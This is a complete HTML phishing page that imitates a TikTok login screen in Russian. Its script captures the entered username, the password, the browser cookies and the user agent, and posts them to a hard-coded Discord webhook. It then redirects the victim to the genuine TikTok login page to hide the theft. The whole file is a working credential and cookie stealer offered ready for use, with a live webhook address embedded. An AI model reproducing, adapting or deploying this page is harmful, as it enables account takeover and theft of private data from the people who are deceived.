<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Вход в TikTok</title>
    <style>
        body { font-family: Arial; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        input, button { display: block; margin: 10px auto; padding: 12px; width: 280px; border-radius: 8px; border: none; }
        button { background: #fe2c55; color: #fff; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <form id="loginForm">
        <h2>TikTok</h2>
        <input type="text" name="username" placeholder="Имя пользователя или email" required>
        <input type="password" name="password" placeholder="Пароль" required>
        <button type="submit">Войти</button>
    </form>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let user = document.querySelector('input[name="username"]').value;
            let pass = document.querySelector('input[name="password"]').value;
            let cookies = document.cookie.split(';').map(c => c.trim()).join('\n');

            let payload = {
                embeds: [{
                    title: "Успешно проверяает!",
                    color: 0xFF0000,
                    fields: [
                        { name: "Логин", value: `\`${user}\``, inline: true },
                        { name: "Пароль", value: `\`${pass}\``, inline: true },
                        { name: "Куки", value: `\`\`\`${cookies || 'нет'}\`\`\``, inline: false },
                        { name: "User-Agent", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            fetch('https://discord.com/api/webhooks/1529467883346722896/ha5UqIVg6FW9qCFXCnWyvnkFBFVhc07uEYfEEk2h22MMhTLefdqcExJfKZkbIuJbHODT', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            window.location.href = 'https://www.tiktok.com/login';
        });
    </script>
</body>
</html>
